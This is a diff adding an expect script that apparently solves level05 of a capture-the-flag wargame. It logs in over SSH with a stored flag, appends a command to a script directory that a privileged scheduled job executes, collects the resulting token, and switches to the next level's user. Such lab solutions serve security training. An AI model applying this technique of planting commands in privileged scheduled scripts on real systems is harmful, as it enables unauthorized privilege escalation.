@@ -1,0 +1,30 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set user [ lindex $argv 2 ]
+set password [ exec cat "../../flag04/flag" ]
+
+spawn ssh "$user\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "find / -user 'flag05' 2>/dev/null\r"
+	send "ls -aRl /usr/sbin/openarenaserver\r"
+	send "cat /usr/sbin/openarenaserver\r"
+	send "echo '/bin/getflag >> /tmp/flag05' >> /opt/openarenaserver/script.sh\r"
+	send "chmod +x /opt/openarenaserver/script.sh\r"
+	send "ls -l /opt/openarenaserver/script.sh\r"
+	send "awk '{ print \$NF }' /tmp/flag05 >> /tmp/flag\r"
+	send "tail -1 /tmp/flag\r"
+	send "su level06\r"
+
+set flag [ exec cat ../flag ]
+
+expect "Password:" { send "$flag\r" }
+
+expect -re {\$ $}
+	send "id\r"
+	send "exit\r"
+	send "exit\r"
